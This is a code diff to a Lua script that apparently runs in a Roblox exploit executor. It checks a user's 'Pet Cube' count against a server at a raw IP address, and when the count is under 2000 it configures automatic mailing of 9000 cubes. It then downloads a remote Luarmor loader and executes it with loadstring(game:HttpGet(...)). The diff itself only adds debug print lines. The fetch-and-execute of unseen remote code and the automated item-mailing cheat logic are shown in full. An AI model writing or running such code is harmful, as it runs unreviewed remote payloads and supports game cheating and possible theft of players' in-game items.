@@ -3,8 +3,10 @@ local requests = http_request or request
 
 local function checkMailing(username)
     local url = "http://141.134.135.241:8080/update-user" -- Update the URL as needed
+    print("Checking mailing for user:", username)
 
     local success, response = pcall(function()
+        print("Sending request to:", url)
         return requests({
             Url = url,
             Method = "GET", 
@@ -16,11 +18,17 @@ local function checkMailing(username)
     end)
     
     if success then
+        print("Request successful.")
         local serverData = HttpService:JSONDecode(response.Body)
+        print("Server response received:", response.Body)
+
         local petCubeAmount = serverData.petCubeCount
         local username = serverData.username
         
+        print("Pet Cube Amount for " .. username .. ":", petCubeAmount)
+        
         if petCubeAmount < 2000 then
+            print("Pet Cube amount is less than 2000, updating settings.")
             getgenv().Settings = {
                 Mailing = {
                     ["Pet Cube"] = {Class = "Misc", Amount = "9000"}
@@ -32,7 +40,7 @@ local function checkMailing(username)
                 ["Only Online Accounts"] = false,
             }
 
-            -- Load the mailing system (as per your existing logic)
+            print("Loading mailing system...")
             loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
         else
             print(username .. " has more than 2000 Pet Cubes. No cubes sent.")
